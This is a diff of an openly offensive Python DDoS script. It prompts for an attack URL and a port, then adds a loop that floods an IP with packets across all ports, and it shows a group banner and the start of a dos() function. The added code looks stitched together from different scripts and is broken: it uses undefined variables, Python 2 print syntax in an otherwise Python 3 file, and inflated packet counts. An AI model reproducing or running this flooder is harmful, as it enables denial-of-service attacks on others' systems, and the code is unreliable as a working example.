@@ -1,17 +1,3 @@
-"import httpx"
-"import pystyle"
-"import socks"
-"import pysocks"
-"import requests"
-"import icmplib"
-"import dnspython"
-"import cloudscraper"
-"import colorama"
-"import shutup"
-"import undetected_chromedriver"
-"import psutil"
-"import flask"
-"import wget"
 # DDoS
 import threading
 import requests
@@ -19,6 +5,14 @@ import random
 import os
 import sys
 import time
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
 os.system("clear")
 print("З А Г Р У З К А....")
@@ -28,6 +22,15 @@ os.system("clear")
 print(colored( '''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼"''','blue'))
 
 targ = input("Cсылку для атаки: ")
+port = input("Port   ===> ")
+
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 100000000000
+     port = port + 1
+     print "mengirim %s packet ke %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
 
 def dos():
  while True:
